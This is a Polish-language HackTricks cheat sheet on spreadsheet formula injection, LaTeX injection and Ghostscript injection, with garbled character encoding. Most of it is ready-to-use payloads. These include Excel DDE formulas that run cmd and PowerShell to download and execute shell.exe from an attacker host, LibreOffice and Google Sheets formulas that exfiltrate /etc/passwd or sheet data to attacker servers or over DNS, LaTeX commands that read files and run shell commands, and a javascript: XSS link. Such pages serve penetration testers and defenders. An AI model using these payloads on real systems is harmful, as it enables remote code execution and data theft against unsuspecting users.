# Wstrzykiwanie formuÅ‚/CSV/Doc/LaTeX/GhostScript

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

**Grupa Try Hard Security**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Wstrzykiwanie formuÅ‚

### Informacje

JeÅ›li **wejÅ›cie** jest **odzwierciedlane** w **plikach CSV** (lub w innych plikach, ktÃ³re prawdopodobnie zostanÄ… otwarte w **Excelu**), moÅ¼esz umieÅ›ciÄ‡ formuÅ‚y Excela, ktÃ³re zostanÄ… **wykonane**, gdy uÅ¼ytkownik **otworzy plik** lub gdy uÅ¼ytkownik **kliknie w jakiÅ› link** w arkuszu Excela.

{% hint style="danger" %}
Obecnie **Excel bÄ™dzie alarmowaÅ‚** (kilka razy) uÅ¼ytkownika, gdy coÅ› jest Å‚adowane spoza Excela, aby zapobiec mu dziaÅ‚aniom zÅ‚oÅ›liwym. Dlatego konieczne jest zastosowanie szczegÃ³lnych wysiÅ‚kÃ³w w zakresie inÅ¼ynierii spoÅ‚ecznej do ostatecznego Å‚adunku.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### HiperÅ‚Ä…cze

**PoniÅ¼szy przykÅ‚ad jest bardzo przydatny do wycieku treÅ›ci z koÅ„cowego arkusza kalkulacyjnego i do wykonywania Å¼Ä…daÅ„ do dowolnych lokalizacji. Wymaga jednak klikniÄ™cia w link (i zaakceptowania ostrzeÅ¼eÅ„).**

PoniÅ¼szy przykÅ‚ad zostaÅ‚ zaczerpniÄ™ty z [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

WyobraÅº sobie naruszenie bezpieczeÅ„stwa w systemie zarzÄ…dzania rekordami studenckimi, ktÃ³re jest wykorzystywane poprzez atak za pomocÄ… wstrzykniÄ™cia kodu CSV. GÅ‚Ã³wnym celem atakujÄ…cego jest skompromitowanie systemu uÅ¼ywanego przez nauczycieli do zarzÄ…dzania danymi uczniÃ³w. Metoda ta polega na wstrzykniÄ™ciu zÅ‚oÅ›liwego Å‚adunku do aplikacji, poprzez wprowadzenie szkodliwych formuÅ‚ do pÃ³l przeznaczonych na dane uczniÃ³w. Atak przebiega nastÄ™pujÄ…co:

1. **WstrzykniÄ™cie ZÅ‚oÅ›liwego Åadunku:**
* AtakujÄ…cy przesyÅ‚a formularz danych ucznia, ale zawiera formuÅ‚Ä™ czÄ™sto uÅ¼ywanÄ… w arkuszach kalkulacyjnych (np. `=HYPERLINK("<malicious_link>","Kliknij tutaj")`).
* Ta formuÅ‚a ma na celu utworzenie hiperÅ‚Ä…cza, ktÃ³re jednak wskazuje na zÅ‚oÅ›liwy serwer kontrolowany przez atakujÄ…cego.
2. **Eksportowanie Skompromitowanych Danych:**
* Nauczyciele, nieÅ›wiadomi kompromitacji, korzystajÄ… z funkcji aplikacji do eksportu danych do pliku CSV.
* Plik CSV, po otwarciu, nadal zawiera zÅ‚oÅ›liwy Å‚adunek. Ten Å‚adunek pojawia siÄ™ jako klikalne hiperÅ‚Ä…cze w arkuszu kalkulacyjnym.
3. **WywoÅ‚anie Ataku:**
* Nauczyciel kliknie w hiperÅ‚Ä…cze, wierzÄ…c, Å¼e jest to prawidÅ‚owa czÄ™Å›Ä‡ danych ucznia.
* Po klikniÄ™ciu, wraÅ¼liwe dane (potencjalnie zawierajÄ…ce szczegÃ³Å‚y z arkusza kalkulacyjnego lub komputera nauczyciela) sÄ… przesyÅ‚ane na serwer atakujÄ…cego.
4. **Logowanie Danych:**
* Serwer atakujÄ…cego odbiera i rejestruje wraÅ¼liwe dane przesÅ‚ane z komputera nauczyciela.
* AtakujÄ…cy moÅ¼e nastÄ™pnie wykorzystaÄ‡ te dane do rÃ³Å¼nych zÅ‚oÅ›liwych celÃ³w, dalszego naruszania prywatnoÅ›ci i bezpieczeÅ„stwa uczniÃ³w oraz instytucji.

### RCE

**SprawdÅº** [**oryginalny post**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **dla dalszych szczegÃ³Å‚Ã³w.**

W okreÅ›lonych konfiguracjach lub starszych wersjach Excela, funkcjÄ™ o nazwie Dynamic Data Exchange (DDE) moÅ¼na wykorzystaÄ‡ do wykonywania arbitralnych poleceÅ„. Aby to osiÄ…gnÄ…Ä‡, naleÅ¼y wÅ‚Ä…czyÄ‡ nastÄ™pujÄ…ce ustawienia:

* PrzejdÅº do Plik â†’ Opcje â†’ Centrum Zaufania â†’ Ustawienia Centrum Zaufania â†’ ZewnÄ™trzne ZawartoÅ›ci i wÅ‚Ä…cz **Uruchamianie Serwera Dynamic Data Exchange**.

Gdy arkusz kalkulacyjny z zÅ‚oÅ›liwym Å‚adunkiem zostanie otwarty (i jeÅ›li uÅ¼ytkownik zaakceptuje ostrzeÅ¼enia), Å‚adunek zostanie wykonany. Na przykÅ‚ad, aby uruchomiÄ‡ kalkulator, Å‚adunek bÄ™dzie:
```markdown
`=cmd|' /C calc'!xxx`
```
Dodatkowe polecenia mogÄ… rÃ³wnieÅ¼ zostaÄ‡ wykonane, takie jak pobranie i wykonanie pliku za pomocÄ… PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### WÅ‚Ä…czenie pliku lokalnego (LFI) w LibreOffice Calc

LibreOffice Calc moÅ¼e byÄ‡ uÅ¼ywany do odczytywania plikÃ³w lokalnych i wycieku danych. Oto kilka metod:

* Odczytanie pierwszej linii z lokalnego pliku `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
* Wyciek odczytanych danych do serwera kontrolowanego przez atakujÄ…cego: `=WEBSERVICE(CONCATENATE("http://<adres IP atakujÄ…cego>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Wyciekanie wiÄ™cej niÅ¼ jednej linii: `=WEBSERVICE(CONCATENATE("http://<adres IP atakujÄ…cego>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Wyciek DNS (wysyÅ‚anie odczytanych danych jako zapytania DNS do serwera DNS kontrolowanego przez atakujÄ…cego): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<domena atakujÄ…cego>"))`

### Arkusze Google do wycieku danych Out-of-Band (OOB)

Arkusze Google oferujÄ… funkcje, ktÃ³re mogÄ… byÄ‡ wykorzystane do wycieku danych OOB:

* **CONCATENATE**: ÅÄ…czy ciÄ…gi znakÃ³w - `=CONCATENATE(A2:E2)`
* **IMPORTXML**: Importuje dane z typÃ³w danych strukturalnych - `=IMPORTXML(CONCAT("http://<adres IP atakujÄ…cego:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED**: Importuje kanaÅ‚y RSS lub ATOM - `=IMPORTFEED(CONCAT("http://<adres IP atakujÄ…cego:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML**: Importuje dane z tabel HTML lub list - `=IMPORTHTML (CONCAT("http://<adres IP atakujÄ…cego:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE**: Importuje zakres komÃ³rek z innego arkusza kalkulacyjnego - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Id_arkusza]", "arkusz1!A2:E2")`
* **IMAGE**: Wstawia obraz do komÃ³rki - `=IMAGE("https://<adres IP atakujÄ…cego:Port>/images/srpr/logo3w.png")`

## WstrzykniÄ™cie LaTeX

Zazwyczaj serwery, ktÃ³re znajdziesz w internecie, ktÃ³re **konwertujÄ… kod LaTeX na PDF**, uÅ¼ywajÄ… **`pdflatex`**.\
Ten program uÅ¼ywa 3 gÅ‚Ã³wnych atrybutÃ³w do (nie)zezwalania na wykonanie poleceÅ„:

* **`--no-shell-escape`**: **WyÅ‚Ä…cza** konstrukcjÄ™ `\write18{polecenie}`, nawet jeÅ›li jest wÅ‚Ä…czona w pliku texmf.cnf.
* **`--shell-restricted`**: To samo co `--shell-escape`, ale **ograniczone** do 'bezpiecznego' zestawu **predefiniowanych** \*\*poleceÅ„ (\*\*Na Ubuntu 16.04 lista znajduje siÄ™ w `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **WÅ‚Ä…cza** konstrukcjÄ™ `\write18{polecenie}`. Polecenie moÅ¼e byÄ‡ dowolnym poleceniem powÅ‚oki. Ta konstrukcja jest zazwyczaj zabroniona ze wzglÄ™dÃ³w bezpieczeÅ„stwa.

Jednak istniejÄ… inne sposoby wykonania poleceÅ„, dlatego aby uniknÄ…Ä‡ RCE, bardzo waÅ¼ne jest korzystanie z `--shell-restricted`.

### Odczytaj plik <a href="#read-file" id="read-file"></a>

MoÅ¼esz potrzebowaÄ‡ dostosowaÄ‡ wstrzykniÄ™cie za pomocÄ… opakowaÅ„ takich jak \[ lub $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Odczytaj plik jednolinijkowy
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Odczytaj plik wielowierszowy
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Zapisz plik <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Wykonanie polecenia <a href="#command-execution" id="command-execution"></a>

WejÅ›cie polecenia zostanie przekierowane do stdin, uÅ¼yj pliku tymczasowego, aby je otrzymaÄ‡.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
JeÅ›li otrzymasz bÅ‚Ä…d LaTex, rozwaÅ¼ uÅ¼ycie base64, aby uzyskaÄ‡ wynik bez zÅ‚ych znakÃ³w.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Skrypty miÄ™dzywitrynne <a href="#cross-site-scripting" id="cross-site-scripting"></a>

Od [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Wstrzykiwanie Ghostscript

**SprawdÅº** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## OdnoÅ›niki

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
